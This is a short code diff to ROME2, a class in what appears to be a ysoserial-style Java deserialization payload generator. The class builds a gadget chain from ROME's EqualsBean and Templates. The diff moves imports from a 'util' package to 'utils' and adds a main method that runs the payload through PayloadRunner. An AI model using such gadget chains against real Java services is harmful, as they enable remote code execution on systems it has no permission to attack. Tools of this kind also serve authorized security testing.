@@ -1,11 +1,12 @@
 package A.R.ysogate.payloads.gadgets;
 
 
+import A.R.ysogate.payloads.utils.PayloadRunner;
 import com.sun.syndication.feed.impl.EqualsBean;
 import A.R.ysogate.payloads.ObjectPayload;
 import A.R.ysogate.payloads.annotation.Dependencies;
-import A.R.ysogate.payloads.util.Gadgets;
-import A.R.ysogate.payloads.util.Reflections;
+import A.R.ysogate.payloads.utils.Gadgets;
+import A.R.ysogate.payloads.utils.Reflections;
 
 import javax.xml.transform.Templates;
 import java.util.Map;
@@ -32,5 +33,9 @@ public class ROME2 implements ObjectPayload<Object> {
 		Reflections.setFieldValue(bean, "_obj", o);
 
 		return Gadgets.makeMap(map1, map2);
+	}
+
+	public static void main ( final String[] args ) throws Exception {
+		PayloadRunner.run(ROME2.class, args);
 	}
 }
